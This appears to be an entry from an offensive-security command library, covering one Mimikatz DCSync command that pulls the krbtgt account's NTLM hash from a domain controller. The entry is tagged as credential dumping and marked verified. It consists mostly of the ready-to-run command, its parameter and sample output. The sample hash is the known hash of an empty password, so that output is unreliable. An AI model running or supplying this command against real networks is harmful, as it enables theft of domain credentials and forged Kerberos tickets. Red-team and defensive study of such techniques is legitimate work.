---
id: b98f0b11-bac0-431e-9820-2cf2e9ca93a7
name: mimikatz-dcsync-krbtgt
type: command
executor: bash
data: 'mimikatz.exe "lsadump::dcsync /user:krbtgt" exit'
output: null
created_at: '2023-04-06T03:56:05.989186+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - dcsync
  - credential-dump
verified: true
validated: true
---

# mimikatz-dcsync-krbtgt

## Command

```bash
mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
```

## Description

Performs DCSync to extract the krbtgt account hash from the domain controller.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:krbtgt | Target user for replication | Yes |

## Examples

### Basic Usage

```bash
mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
```

## Expected Output

User : krbtgt
Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

## Related

- [[procedures/AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam]]
- [[tools/Mimikatz]]
